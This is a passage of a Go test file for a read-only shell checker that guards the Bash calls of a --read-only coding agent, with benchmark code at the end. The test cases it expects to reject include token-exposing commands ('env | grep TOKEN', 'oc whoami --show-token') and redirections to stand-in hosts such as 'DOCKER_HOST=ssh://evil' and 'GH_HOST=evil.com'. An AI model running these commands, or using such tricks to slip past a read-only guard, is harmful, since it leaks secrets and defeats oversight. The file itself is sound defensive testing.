		"x=secret; kubectl get $x", "kubectl get ${x:-secret}", "git log --{output,}=/tmp/x", "git grep -{O,} sh x",
		"gh auth status -{t,}", "x='$(id)'; echo ${x@P}",
		"PATH=/tmp/x; git log", "HOME=/tmp/x; git log", "XDG_CONFIG_HOME=/tmp/x && gh pr list", "BASH_ENV=/tmp/x; ls",
		"FOO=1 git status", "printf -v PATH /tmp/x; ls", "KUBERNETES_MASTER=http://evil kubectl get pods",
		"KUBECONFIG=/tmp/x kubectl get pods", "DOCKER_HOST=ssh://evil docker ps", "AWS_CONFIG_FILE=/tmp/x aws sts get-caller-identity",
		"CLOUDSDK_PYTHON=/tmp/x gcloud version", "GH_HOST=evil.com gh pr list",
		"env | grep TOKEN", "env | wc -l", "env -0 | grep x", "/usr/bin/env | grep x", "env; grep x y", "env && ls",
		"command env | grep x", "nohup env | grep x", "time env | grep x", "ls | env", "printenv | grep x", "set | grep x",
		"export -p | grep x", "declare -p | grep x", "compgen -v | grep x", "compgen -e",
		"claude-code agents sync", "claude-code agents sync --agent codex", "claude-code agents sync --check --force",
		"rg x *", "git grep x *", "rg x -*", "git grep -nOless x",
	} {
		rows = append(rows, roCase{c, false})
	}
	for _, c := range []string{
		"grep 'a{2}' f", "grep -E 'x{1,3}' f", `rg '\$HOME' x`, "grep 'a$' f", `grep "a$" f`, `git log --format="%h %s"`,
		"echo '$HOME'", "echo done", "LC_ALL=C git status", "TZ=UTC git log -1", "git stash show -p stash@{1}",
		"git branch -av", "git branch -rv", "git grep -n foo", "git grep -il foo", "git remote -v",
		"claude-code agents sync --check", "claude-code agents sync --dry-run --agent codex",
		"rg x src/*.go", "cat *.go", "git log -SOpenFile", "git grep -eOpen",
	} {
		rows = append(rows, roCase{c, true})
	}
	checkReadOnly(t, rows)
}

// Short-flag clusters are read letter by letter, and each CLI subcommand takes only the flags on its list.
func TestReadOnlyCLIFlagAllowList(t *testing.T) {
	var rows []roCase
	for _, c := range []string{
		"gh auth status -at", "gh auth status -atq", "kubectl get pods -Aw", "kubectl get pods -wl x", "kubectl logs x -pf",
		"docker logs x -tf", "gh pr view -cw", "gh issue view 1 -cw", "gh pr list -wa", "gh run view 1 -vw",
		"kubectl get pods -oyaml", "aws sts get-caller-identity --output yaml2",
		"git grep -iOsh x", "git grep -nO sh x",
		"docker inspect x", "docker inspect -f '{{.Config.Env}}' x", "oc get oauthclients", "oc get oauthclient x -o yaml",
		"oc get oauthaccesstokens", "oc get oauthauthorizetokens", "oc get useroauthaccesstokens", "kubectl get pods -o yaml",
		"kubectl get pods -o json", "kubectl get pods -o=go-template=x", "kubectl get pods -ojson", "kubectl get cm -o yaml",
		"kubectl get pods -o custom-columns=E:.spec", "kubectl get pods --profile=cpu --profile-output=/tmp/x",
		"kubectl get pods --cache-dir=/x", "kubectl get pods --proxy-url=http://evil", "kubectl get pods --insecure-skip-tls-verify",
		"kubectl get pods --user=x", "kubectl get pods --filename=x", "kubectl get pods -A=true", "kubectl get pods --all-namespaces=1",
		"aws sts get-caller-identity --debug", "aws sts get-caller-identity --endpoint-url http://evil", "aws --debug sts get-caller-identity",
		"gcloud config list --access-token-file=/x", "gcloud config list --log-http", "gh pr list --jq .[]", "gh pr view 1 -t x",
		"oc whoami -t", "oc whoami --show-token", "oc whoami -ct", "docker logs x --details", "docker ps --format",
		"kubectl logs x --follow=true", "kubectl get pods --", "gh pr list -R evil.com/a/b",
	} {
		rows = append(rows, roCase{c, false})
	}
	for _, c := range []string{
		"kubectl get pods -A -o wide", "kubectl get pods -l app=x -n ns", "kubectl get pods --selector=app=x -o name",
		"kubectl logs x --tail 50 --since 1h -c app", "kubectl logs x --tail=50 -p", "kubectl describe pod x -n ns",
		"kubectl top pods -A", "docker logs x --tail 100 -t", "docker ps -aq", "docker images -q", "docker network ls",
		"docker volume ls -q", "gh pr view 42 --json title,body", "gh pr list -L 5 -s open", "gh auth status -a",
		"gh run list -L 5", "gh pr view 42 -c", "gh pr list -R a/b", "oc whoami", "oc whoami --show-server",
		"kubectl get serviceaccounts",
		"kubectl get pods -owide", "kubectl get pods -lapp=web", "docker ps -n5", "docker ps --format '{{.Names}}'",
		"aws sts get-caller-identity --output json", "gcloud config list --format=json",
	} {
		rows = append(rows, roCase{c, true})
	}
	checkReadOnly(t, rows)
}

// The read-only check runs on every Bash call of a --read-only agent.
func BenchmarkReadOnlyShell(b *testing.B) {
	var script []string
	for i := range 40 {
		script = append(script, []string{"git status", "rg foo internal", "cat a.go | head -5", "git log --oneline -3"}[i%4])
	}
	for name, cmd := range map[string]string{"status": "git status",
		"pipe6":    "git log --oneline -20 | grep x | head -5 | cat | wc -l | tail -1",
		"script40": strings.Join(script, "\n")} {
		b.Run(name, func(b *testing.B) {
			for b.Loop() {
				ReadOnlyShell(cmd)
			}
		})
	}
}
